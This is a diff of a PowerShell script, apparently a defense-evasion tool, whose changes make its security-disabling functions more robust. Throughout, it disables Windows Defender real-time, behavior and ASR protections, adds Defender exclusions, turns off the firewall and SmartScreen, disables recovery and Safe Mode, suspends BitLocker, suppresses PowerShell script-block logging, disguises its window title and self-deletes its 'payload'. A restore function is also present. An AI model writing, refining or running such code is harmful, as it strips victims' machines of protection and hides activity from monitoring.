@@ -1383,8 +1383,12 @@ function Test-BuiltInAdmin {
 function Add-DefenderExclusion {
     param([string]$Path)
     try {
-        Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
-        Write-Log -Message "Defender exclusion added: $Path" -Type "INFO" -Color Gray
+        if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
+            Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue
+            Write-Log -Message "Defender exclusion added: $Path" -Type "INFO" -Color Gray
+        } else {
+            Write-Log -Message "Add-MpPreference not available; skipped Defender exclusion for $Path." -Type "WARN" -Color Yellow
+        }
     } catch { Write-Log -Message "Failed to add Defender exclusion for $Path`: $_" -Type "WARN" -Color Yellow }
 }
 
@@ -1395,7 +1399,7 @@ function Disable-RecoveryAndSafeMode {
         bcdedit /set {current} bootstatuspolicy ignoreallfailures /f 2>$null | Out-Null
         bcdedit /set {current} recoveryenabled No /f 2>$null | Out-Null
         bcdedit /set {current} nx AlwaysOff /f 2>$null | Out-Null
-        reagentc /disable 2>$null | Out-Null
+        cmd /c "reagentc.exe /disable" 2>$null | Out-Null
         Write-Log -Message "Safe Mode and Recovery disabled." -Type "INFO" -Color Gray
     } catch { Write-Log -Message "BCD edit failed: $_" -Type "WARN" -Color Yellow }
 }
@@ -1462,8 +1466,14 @@ function Invoke-SelfDestruct {
     param([string]$Path)
     try {
         if (Test-Path $Path) {
-            Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
-            Write-Log -Message "Original payload self-destructed: $Path" -Type "INFO" -Color Gray
+            $InstallDirFull = (Get-Item $GodModeInstallDir -ErrorAction SilentlyContinue).FullName
+            $TargetFull = (Get-Item $Path -ErrorAction SilentlyContinue).FullName
+            if ($InstallDirFull -and $TargetFull -and $TargetFull.StartsWith($InstallDirFull, [System.StringComparison]::OrdinalIgnoreCase)) {
+                Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
+                Write-Log -Message "Original payload self-destructed: $Path" -Type "INFO" -Color Gray
+            } else {
+                Write-Log -Message "Self-destruct skipped: $Path is not inside the install directory ($GodModeInstallDir). Source preserved." -Type "INFO" -Color Gray
+            }
         }
     } catch { Write-Log -Message "Self-destruct failed: $_" -Type "WARN" -Color Yellow }
 }
@@ -1535,32 +1545,48 @@ function Disable-LSAProtection {
 
 function Disable-BitLocker {
     try {
-        $Volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
-        foreach ($Vol in $Volumes) {
-            Suspend-BitLocker -MountPoint $Vol.MountPoint -RebootCount 0 -ErrorAction SilentlyContinue
-            Write-Log -Message "BitLocker suspended on $($Vol.MountPoint)." -Type "INFO" -Color Gray
+        if (Get-Command Get-BitLockerVolume -ErrorAction SilentlyContinue) {
+            $Volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue | Where-Object { $_.ProtectionStatus -eq 'On' }
+            foreach ($Vol in $Volumes) {
+                Suspend-BitLocker -MountPoint $Vol.MountPoint -RebootCount 0 -ErrorAction SilentlyContinue
+                Write-Log -Message "BitLocker suspended on $($Vol.MountPoint)." -Type "INFO" -Color Gray
+            }
+        } else {
+            Write-Log -Message "Get-BitLockerVolume not available; BitLocker suspension skipped." -Type "WARN" -Color Yellow
         }
     } catch { Write-Log -Message "Failed to suspend BitLocker: $_" -Type "WARN" -Color Yellow }
 }
 
 function Disable-ASR {
     try {
-        Set-MpPreference -AttackSurfaceReductionRules_Actions @{} -ErrorAction SilentlyContinue
-        Set-MpPreference -AttackSurfaceReductionOnlyExclusions @() -ErrorAction SilentlyContinue
-        Write-Log -Message "Attack Surface Reduction (ASR) rules disabled." -Type "INFO" -Color Gray
+        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
+            Set-MpPreference -AttackSurfaceReductionRules_Actions @{} -ErrorAction SilentlyContinue
+            Set-MpPreference -AttackSurfaceReductionOnlyExclusions @() -ErrorAction SilentlyContinue
+            Write-Log -Message "Attack Surface Reduction (ASR) rules disabled." -Type "INFO" -Color Gray
+        } else {
+            Write-Log -Message "Set-MpPreference not available; ASR disable skipped." -Type "WARN" -Color Yellow
+        }
     } catch { Write-Log -Message "Failed to disable ASR: $_" -Type "WARN" -Color Yellow }
 }
 
 function Disable-ControlledFolderAccess {
     try {
-        Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
-        Write-Log -Message "Controlled Folder Access disabled." -Type "INFO" -Color Gray
+        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
+            Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
+            Write-Log -Message "Controlled Folder Access disabled." -Type "INFO" -Color Gray
+        } else {
+            Write-Log -Message "Set-MpPreference not available; Controlled Folder Access disable skipped." -Type "WARN" -Color Yellow
+        }
     } catch { Write-Log -Message "Failed to disable Controlled Folder Access: $_" -Type "WARN" -Color Yellow }
 }
 
 function Disable-ExploitGuard {
     try {
-        Set-MpPreference -EnableNetworkProtection AuditMode -ErrorAction SilentlyContinue
+        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
+            Set-MpPreference -EnableNetworkProtection AuditMode -ErrorAction SilentlyContinue
+        } else {
+            Write-Log -Message "Set-MpPreference not available; Exploit Guard network protection disable skipped." -Type "WARN" -Color Yellow
+        }
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\Network Protection" -Name "EnableNetworkProtection" -Value 0 -Force -ErrorAction SilentlyContinue
         Write-Log -Message "Exploit Guard / Network Protection disabled." -Type "INFO" -Color Gray
     } catch { Write-Log -Message "Failed to disable Exploit Guard: $_" -Type "WARN" -Color Yellow }
@@ -1624,8 +1650,7 @@ function Invoke-StealthMode {
     try {
         # Hide window title from casual inspection
         $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
-        $Proc = Get-Process -Id $PID -ErrorAction SilentlyContinue
-        if ($Proc) { $Proc.MainWindowTitle = "Windows PowerShell" }
+        # MainWindowTitle is read-only on some processes; skip direct assignment to avoid runtime error
         
         # Suppress script-block logging and transcription via registry (if not already hardened)
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -Force -ErrorAction SilentlyContinue
@@ -1750,22 +1775,26 @@ function Enable-DangerousMode {
 
     # 3. Disable MpPreference settings (requires tamper protection off)
     try {
-        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
-        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
-        Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
+        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
+            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
+            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
+            Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
+        } else {
+            Write-Log -Message "Set-MpPreference not available; MpPreference disable skipped." -Type "WARN" -Color Yellow
+        }
     } catch {
         Write-Log -Message "Error setting MpPreference: $_" -Type "WARN" -Color Yellow
     }
 
     # 4. Disable Firewall and SmartScreen
     try {
-        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "False" -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
         Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
     } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }
@@ -1891,19 +1920,23 @@ function Disable-DangerousMode {
 
     # 3. Restore MpPreference
     try {
-        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
-        Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
-        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
-        Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
+        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
+            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
+            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
+            Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
+        } else {
+            Write-Log -Message "Set-MpPreference not available; MpPreference restore skipped." -Type "WARN" -Color Yellow
+        }
     } catch { Write-Log -Message "Error restoring MpPreference: $_" -Type "WARN" -Color Yellow }
 
     # 4. Restore Firewall and SmartScreen
     try {
-        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "True" -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
     } catch { Write-Log -Message "Error restoring firewall/smartscreen: $_" -Type "WARN" -Color Yellow }
 
@@ -1928,7 +1961,7 @@ function Disable-DangerousMode {
         bcdedit /set {current} bootstatuspolicy displayallfailures /f 2>$null | Out-Null
         bcdedit /set {current} recoveryenabled Yes /f 2>$null | Out-Null
         bcdedit /set {current} nx OptIn /f 2>$null | Out-Null
-        reagentc /enable 2>$null | Out-Null
+        cmd /c "reagentc.exe /enable" 2>$null | Out-Null
         Write-Log -Message "Safe Mode and Windows RE restored." -Type "INFO" -Color Gray
     } catch { Write-Log -Message "BCD restore failed: $_" -Type "WARN" -Color Yellow }
 
